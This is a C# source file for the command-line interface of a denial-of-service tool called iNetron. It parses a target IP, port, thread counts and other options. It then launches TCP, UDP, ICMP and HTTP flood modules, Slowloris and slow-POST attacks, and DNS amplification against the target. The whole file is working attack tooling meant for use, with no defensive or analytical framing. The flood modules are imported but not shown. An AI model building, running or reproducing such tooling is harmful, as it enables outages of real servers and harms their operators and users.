using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Reflection;
using iNetron.Core.Methods.Amp;
using iNetron.Core.Methods.App;
using iNetron.Core.Methods.Vol;

namespace iNetron.CLI
{
    class Program
    {
        private static string GetHelpText()
        {
            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("iNetron.CLI.Resources.inetron.usage.txt"))
            using (var reader = new StreamReader(stream))
                return reader.ReadToEnd();
        }
        static void Main(string[] args)
        {
            if (args.Length < 1)
                Console.Error.WriteLine("iNetron.CLI requires additional input to function. For help, use switch /?");
            else
            {
                if (args.Contains("/?"))
                    Console.WriteLine(GetHelpText());
                else
                    Process(args);
            }
            return;
        }
        private static void ThrowError(int index)
        {
            Console.Error.WriteLine("Argument Error | Index = " + index);
            Environment.Exit(1);
        }
        private static void Process(string[] argv)
        {
            try
            {
                if (argv[0] == "/dns")
                    ParseDNS(argv);
                else if (argv[0] == "/loris")
                    ParseApplication(argv, false);
                else if (argv[0] == "/srudy")
                    ParseApplication(argv, true);
                else if (argv[0] == "/http")
                    ParseHTTP(argv);
                else if (argv[0] == "/icmp")
                    ParseICMP(argv);
                else if (argv[0] == "/tcp")
                    ParseFLOOD(argv, false);
                else if (argv[0] == "/udp")
                    ParseFLOOD(argv, true);
                else
                    Console.Error.WriteLine(GetHelpText());
            }
            catch (Exception e)
            { 
                Console.Error.WriteLine("iNetron.CLI has suffered an error. It's your fault.\n\n" + e.ToString());
                Environment.Exit(1);
            }
        }
        private static void ParseFLOOD(string[] argc, bool udp)
        {
            object targetIP = argc[1];
            object port = argc[2];
            object size = argc[3];
            object threads = argc[4];

            IPAddress targetIP_t;
            int port_t = 80;
            int size_t = 80;
            int threads_t = 4;

            if (!IPAddress.TryParse((string)targetIP, out targetIP_t))
                ThrowError(1);

            if (!int.TryParse((string)port, out port_t))
                ThrowError(2);

            if (!int.TryParse((string)size, out size_t))
                ThrowError(3);

            if (!int.TryParse((string)threads, out threads_t))
                ThrowError(4);

            if(udp)
            {
                Console.WriteLine("Flooding UDP: " + targetIP_t.ToString() + " . . .");

                udp udpModule = new udp(targetIP_t.ToString(), port_t, size_t, threads_t);
                udpModule.floodNow();
            }
            else
            {
                Console.WriteLine("Flooding TCP: " + targetIP_t.ToString() + " . . .");

                tcp tcpModule = new tcp(targetIP_t.ToString(), port_t, size_t, threads_t);
                tcpModule.floodNow();
            }
        }
        private static void ParseICMP(string[] argc)
        {
            object targetIP = argc[1];
            object size = argc[2];
            object threads = argc[3];

            IPAddress targetIP_t;
            int size_t = 80;
            int threads_t = 4;

            if (!IPAddress.TryParse((string)targetIP, out targetIP_t))
                ThrowError(1);

            if (!int.TryParse((string)size, out size_t))
                ThrowError(2);

            if (!int.TryParse((string)threads, out threads_t))
                ThrowError(3);

            Console.WriteLine("Sending Ping to " + targetIP_t.ToString() + " . . .");

            icmp icmpModule = new icmp(targetIP_t.ToString(), size_t, threads_t);
            icmpModule.floodNow();
        }
        private static void ParseHTTP(string[] argc)
        {
            object targetIP = argc[1];
            object https = argc[2];
            object port = argc[3];
            object socks = argc[4];
            object ua = argc[5];

            IPAddress targetIP_t;
            bool https_t = false;
            int port_t = 80;
            int socks_t = 200;
            string ua_t = "unknown.device";

            if (!IPAddress.TryParse((string)targetIP, out targetIP_t))
                ThrowError(1);

            if (https.ToString().ToLower() == "yes" || https.ToString().ToLower() == "y")
                https_t = true;
            else if (https.ToString().ToLower() == "no" || https.ToString().ToLower() == "n")
                https_t = false;
            else
                ThrowError(2);

            if (!int.TryParse((string)port, out port_t))
                ThrowError(3);

            if (!int.TryParse((string)socks, out socks_t))
                ThrowError(4);

            try { ua_t = ua.ToString(); }
            catch { ThrowError(5); }

            Console.WriteLine("Flooding Server: " + targetIP_t.ToString() + " on port: " + port_t.ToString() + " . . .");

            http httpModule = new http(ua_t, targetIP_t.ToString(), https_t, port_t);
            httpModule.createHttp(socks_t);
        }
        private static void ParseApplication(string[] argc, bool srudy)
        {
            object targetIP = argc[1];
            object https = argc[2];
            object port = argc[3];
            object socks = argc[4];
            object ua = argc[5];

            IPAddress targetIP_t;
            bool https_t = false;
            int port_t = 80;
            int socks_t = 200;
            string ua_t = "unknown.device";

            if (!IPAddress.TryParse((string)targetIP, out targetIP_t))
                ThrowError(1);

            if (https.ToString().ToLower() == "yes" || https.ToString().ToLower() == "y")
                https_t = true;
            else if (https.ToString().ToLower() == "no" || https.ToString().ToLower() == "n")
                https_t = false;
            else
                ThrowError(2);

            if (!int.TryParse((string)port, out port_t))
                ThrowError(3);

            if (!int.TryParse((string)socks, out socks_t))
                ThrowError(4);

            try { ua_t = ua.ToString(); }
            catch { ThrowError(5); }

            if (srudy)
            {
                Console.WriteLine("Can I POST yet? " + targetIP_t.ToString() + " . . .");

                srudy srudyModule = new srudy(targetIP_t.ToString(), https_t, port_t);
                srudyModule.createSRudy(socks_t, ua_t);
            }
            else
            {
                Console.WriteLine("The Loris' are coming for " + targetIP_t.ToString() + " . . .");

                loris lorisModule = new loris(targetIP_t.ToString(), https_t, port_t);
                lorisModule.createLoris(socks_t, ua_t);
            }
        }    
        private static void ParseDNS(string[] argc)
        {
            object targetIP = argc[1];
            object dnsIP = argc[2];
            object useIP6 = argc[3];

            IPAddress targetIP_t;
            IPAddress dnsIP_t;
            bool useIP6_t = false;
            string domain_t;

            if (!IPAddress.TryParse((string)targetIP, out targetIP_t))
                ThrowError(1);
            if (!IPAddress.TryParse((string)dnsIP, out dnsIP_t))
                ThrowError(2);

            if (useIP6.ToString().ToLower() == "yes" || useIP6.ToString().ToLower() == "y")
                useIP6_t = true;
            else if (useIP6.ToString().ToLower() == "no" || useIP6.ToString().ToLower() == "n")
                useIP6_t = false;
            else
                ThrowError(3);

            if (argc.Length > 4)
                domain_t = (string)(object)argc[4];
            else
                domain_t = "sni.cloudflaressl.com";

            dns dnsModule = new dns(targetIP_t.ToString(), dnsIP_t.ToString(), domain_t, 53, 53, useIP6_t);
            dnsModule.Start();

            Console.WriteLine("Sending Amplification to: " + targetIP_t.ToString() + " . . .");
        }
    }
}
